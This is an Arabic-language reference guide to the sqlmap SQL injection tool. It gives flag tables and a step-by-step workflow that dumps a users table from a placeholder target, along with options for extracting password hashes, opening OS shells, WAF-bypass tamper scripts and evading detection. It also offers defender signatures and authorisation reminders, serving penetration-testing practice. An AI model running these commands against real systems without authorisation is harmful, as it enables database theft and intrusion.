# sqlmap — الدليل الشامل

تعد أداة `sqlmap` الأداة الأكثر شهرة لأتمتة عمليات اكتشاف واستغلال ثغرات حقن الاستعلامات (SQL Injection) عبر قواعد بيانات متعددة مثل MySQL، PostgreSQL، Microsoft SQL Server، Oracle، SQLite وغيرها الكثير. تدعم الأداة تقنيات الحقن المختلفة مثل: Error-based، Boolean-blind، Time-blind، UNION، و Stacked queries لكل معامل (Parameter). كما تمكن المحلل من سحب قواعد البيانات، قراءة الملفات، وحتى تنفيذ أوامر على مستوى نظام التشغيل (في حال سمح محرك قاعدة البيانات بذلك).

## التثبيت (Install)

```terminal
git clone --depth=1 https://github.com/sqlmapproject/sqlmap
cd sqlmap && python3 sqlmap.py --version

apt install sqlmap
brew install sqlmap
```

## تحديد الهدف (Target specification)

| العلم | الغرض |
|------|---------|
| `-u <url>` | الرابط المراد فحصه مع المعاملات |
| `-r <file>` | طلب HTTP خام (مستخرج من Burp أو `curl --trace-ascii`) |
| `-l <file>` | قائمة روابط (سجلات Burp) |
| `-m <file>` | ملف يحتوي على أهداف متعددة (رابط في كل سطر) |
| `-g <dork>` | استخدام Google dork للحصول على روابط حية |
| `-c <config>` | ملف إعدادات بصيغة INI |
| `-X <method>` | تحديد طريقة طلب HTTP (مثل POST, PUT) |
| `-d <connstring>` | اتصال مباشر بقاعدة البيانات (مثل `mysql://user:pass@host:3306/db`) |

## تحديد نقاط الحقن (Specifying where to inject)

| العلم | الغرض |
|------|---------|
| `-p <param>` | فحص معاملات محددة فقط (قائمة مفصولة بفاصلة) |
| `--skip <param>` | تخطي معاملات معينة |
| `--data <body>` | محتوى طلب POST (مثل `a=1&b=FUZZ`) |
| `--cookie <c>` | فحص ملفات تعريف الارتباط (Cookies) |
| `--user-agent <ua>` | فحص ترويسة User-Agent |
| `--headers "X: Y"` | إضافة ترويسات إضافية (استخدم `\n` للفصل) |
| `--auth-type` | نوع المصادقة (basic, digest, ntlm, pki) |
| `--auth-cred` | بيانات المصادقة (user:pass) |
| `--proxy` | توجيه الطلبات عبر وكيل (مثل Burp `http://127.0.0.1:8080`) |
| `--tor` | توجيه الطلبات عبر شبكة Tor |
| `--random-agent` | استخدام User-Agent عشوائي |
| `--ignore-code 404` | عدم اعتبار كود 404 كفشل في الاتصال |
| `--csrf-token` / `--csrf-url` | التعامل التلقائي مع رموز CSRF |
| `--force-ssl` | فرض استخدام HTTPS |
| `-s <session>` | استكمال جلسة فحص سابقة |

## خيارات الاكتشاف (Detection knobs)

| العلم | الغرض |
|------|---------|
| `--level 1..5` | عمق الفحص: يشمل ملفات الارتباط والترويسات في المستويات الأعلى (الافتراضي 1) |
| `--risk 1..3` | مستوى الخطورة: المستوى 3 قد يتضمن عمليات UPDATE (خطر على البيانات) |
| `--technique BEUSTQ` | تحديد تقنية الحقن: B(boolean)، E(error)، U(union)، S(stacked)، T(time)، Q(inline) |
| `--prefix` / `--suffix` | إضافة بادئة أو لاحقة يدوية لبيانات الحقن |
| `--dbms <name>` | تحديد نوع قاعدة البيانات لتسريع الفحص وتجاوز مرحلة الاكتشاف |
| `--os <name>` | تحديد نظام التشغيل |
| `--time-sec <int>` | ثواني التأخير لفحص Time-based (الافتراضي 5) |
| `--union-cols <range>` | عدد الأعمدة المراد اختبارها في تقنية UNION |
| `--tamper <scripts>` | استخدام سكربتات التلاعب (Tamper scripts) لتجاوز جدران حماية تطبيقات الويب (WAF) |
| `--threads <n>` | عدد الطلبات المتزامنة لسحب البيانات |

يرفع خيار `--level` من عدد النقاط المختبرة (المستوى 5 يختبر الكوكيز، UA، و Referer). أما خيار `--risk 3` فيفعل تقنيات تعتمد على OR و Time-based قد تؤدي لتعديل البيانات (يستخدم فقط في البيئات المختبرية أو المصرح بها).

## استخراج البيانات (Extraction)

| العلم | النتيجة |
|------|--------|
| `--current-user` | اسم مستخدم قاعدة البيانات الحالي |
| `--current-db` | اسم قاعدة البيانات الحالية |
| `--hostname` | اسم المضيف (Hostname) لخادم قاعدة البيانات |
| `--is-dba` | هل المستخدم الحالي لديه صلاحيات المسؤول (DBA)؟ |
| `--users` | قائمة بكافة مستخدمي قاعدة البيانات |
| `--passwords` | سحب هاشات كلمات المرور |
| `--privileges` | صلاحيات كل مستخدم |
| `--dbs` | عرض كافة قواعد البيانات |
| `-D <db>` | اختيار قاعدة بيانات معينة |
| `--tables` | عرض الجداول في قاعدة البيانات المختارة |
| `-T <table>` | اختيار جدول معين |
| `--columns` | عرض الأعمدة في الجدول المختار |
| `-C col1,col2` | اختيار أعمدة محددة |
| `--dump` | سحب سجلات الجدول (Rows) |
| `--dump-all` | سحب كافة قواعد البيانات المتاحة |
| `--exclude-sysdbs` | تخطي قواعد بيانات النظام الافتراضية |
| `--start` / `--stop` | تحديد نطاق السجلات المراد سحبها |
| `--where` | تصفية البيانات المسحوبة (مثل `"id < 10"`) |
| `--search` | البحث عن أعمدة أو جداول في المخطط (Schema) |

## العمليات على مستوى النظام (OS-level)

| العلم | النتيجة |
|------|--------|
| `--os-shell` | الحصول على واجهة أوامر (OS shell) عبر ثغرة الحقن |
| `--os-pwn` | الحصول على جلسة Meterpreter أو VNC |
| `--os-cmd "id"` | تنفيذ أمر واحد على نظام التشغيل |
| `--file-read` | قراءة ملف من خادم قاعدة البيانات |
| `--file-write` | رفع ملف إلى الخادم عبر SQL |
| `--reg-read` / `--reg-add` | العمليات على سجلات ويندوز (Registry) |
| `--sql-shell` | واجهة SQL تفاعلية |
| `--sql-query` | تنفيذ استعلام SQL واحد |

## سير العمل (Workflow)

### 1. مرحلة الاكتشاف (Detection)

```terminal
sqlmap -u "https://target.com/item?id=1" --batch --random-agent --level 5 --risk 2
```

خيار `--batch` يقوم بالإجابة التلقائية على كافة الأسئلة (مفيد للأتمتة والسكربتات).

### 2. التركيز على المعامل المصاب

```terminal
sqlmap -u "..." --batch -p id --dbms mysql
```

### 3. رسم مخطط قاعدة البيانات (Schema Mapping)

```terminal
sqlmap -u "..." --batch -p id --dbs
sqlmap -u "..." --batch -p id -D appdb --tables
sqlmap -u "..." --batch -p id -D appdb -T users --columns
sqlmap -u "..." --batch -p id -D appdb -T users --dump
```

### 4. الفحص باستخدام ملف طلب Burp (الأكثر واقعية)

```terminal
sqlmap -r request.txt --batch --level 3 --risk 2 --dbs
```

من خلال Burp: انقر يميناً على الطلب -> Copy to file -> احفظه باسم `request.txt`. يمكنك تحديد نقطة الفحص بوضع علامة `*` (مثل `id=1*&...`).

### 5. تجاوز الـ WAF باستخدام سكربتات التلاعب (Tamper)

```terminal
sqlmap -u "..." --batch \
  --tamper space2comment,between,charunicodeencode,modsecurityzeroversioned \
  --random-agent --delay 1
```

لعرض مئات السكربتات المتاحة: `python3 sqlmap.py --list-tampers`. الخيارات الشائعة:
- `space2comment` — يحول المسافات إلى تعليقات: `' OR 1=1--` تصبح `'/**/OR/**/1=1--`
- `between` — يحول علامة `=` إلى `BETWEEN`/`AND`
- `charunicodeencode` — ترميز حروف الحمولة (Payload)
- `modsecurityzeroversioned` — خدعة لنظام MySQL لتجاوز ModSecurity

## تحليل المخرجات (Output Analysis)

```
[INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
[INFO] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind' injectable
[INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
```

السطر الذي يحتوي على "injectable" هو اكتشافك الرئيسي. تقنية Time-based بمفردها دون ظهور UNION أو Error غالباً ما تشير إلى وجود WAF يحجب جزئياً — يجب التحقق يدوياً.

## المشاكل الشائعة والحلول

| العرض | السبب | الحل |
|---------|-------|-----|
| `all tested parameters do not appear to be injectable` | نقطة حقن خاطئة أو مفلترة | ارفع `--level`؛ استخدم `--prefix`, `--suffix`؛ تحقق يدوياً |
| رسائل `connection timed out` كثيرة | الخادم بطيء أو الـ WAF يحجب | أضف `--delay 2`؛ ارفع `--retries`؛ قلل عدد الـ threads |
| نتائج إيجابية خاطئة (False Positive) | ضجيج في خوارزمية الاكتشاف | استخدم `--technique B` فقط للتحقق، أو استخدم Burp Repeater |
| فشل سحب المخطط بعد الاكتشاف | تم اكتشاف الثغرة ولكن طلبات السحب محجوبة | جرب `--technique` مختلفة (مثل الانتقال من time إلى UNION) |

## منظور المدافع (Defender's perspective)

تترك sqlmap الكثير من البصمات (Signatures):
- طلبات متكررة لنفس الرابط مع تغيرات طفيفة في المعاملات.
- بصمات في الـ WAF: مثل `0x6f7265` (hex 'or')، أو استدعاءات `SLEEP(` و `BENCHMARK(`.
- User-Agent الافتراضي: `sqlmap/<version>`.
- فحص Time-based يسبب ارتفاعاً ملحوظاً في وقت استجابة قاعدة البيانات (Latency).

## أمن العمليات (OPSEC)

- استخدم دائماً `--random-agent` لتجنب كشف الأداة عبر ترويسة UA.
- سحب البيانات بتقنية Time-based **بطيء جداً ومثير للشبهات** — كل حرف يستغرق حوالي 5 ثوانٍ. استخدم UNION كلما أمكن.
- تأكد أن نطاق العمل (Scope) يسمح بسحب البيانات (Dumping) وليس الاكتشاف فقط.
- خيار `--os-shell` يقوم بالتعديل على الهدف (كتابة ملفات مؤقتة)؛ تأكد من الحصول على تصريح صريح بذلك.

## أدوات ذات صلة

| الأداة | التخصص |
|------|-------|
| `Burp Repeater` | للتحقق اليدوي عند فشل الأداة التلقائية |
| `NoSQLMap` | لحقن قواعد بيانات NoSQL (مثل MongoDB) |
| `commix` | لأتمتة ثغرات حقن الأوامر (Command Injection) |
| `xsstrike` | لأتمتة فحص واستغلال ثغرات XSS |
| `ghauri` | بديل أسرع وأحدث لـ sqlmap |
